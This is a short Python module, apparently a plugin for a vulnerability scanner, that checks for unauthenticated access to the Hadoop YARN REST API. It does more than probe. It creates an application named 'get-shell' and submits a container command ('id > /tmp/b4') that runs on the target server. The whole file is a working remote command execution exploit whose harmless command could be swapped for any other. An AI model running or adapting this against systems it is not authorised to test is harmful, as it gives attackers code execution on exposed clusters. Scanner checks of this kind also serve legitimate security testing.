import json
from typing import Optional

import requests

from lib.log import logger


def run(url: str, port: int) -> Optional[str]:
    address = f"{url}:{port}"
    try:
        # new application
        resp1 = requests.post(f"{address}/ws/v1/cluster/apps/new-application", timeout=9, verify=False)
        app_id = resp1.json().get('application-id')
        if not app_id:
            return None
        # submit
        payload = {
            'application-id': app_id,
            'application-name': 'get-shell',
            'am-container-spec': {'commands': {'command': 'id > /tmp/b4'}},
            'application-type': 'YARN'
        }
        resp2 = requests.post(f"{address}/ws/v1/cluster/apps", json=payload, timeout=9, verify=False)
        if resp2.status_code == 202:
            return "Hadoop YARN unauth Vulnerable"
        logger.warning(f"Failed, status code: {resp2.status_code}")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except json.JSONDecodeError as e:
        logger.error(f"JSON decode failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None
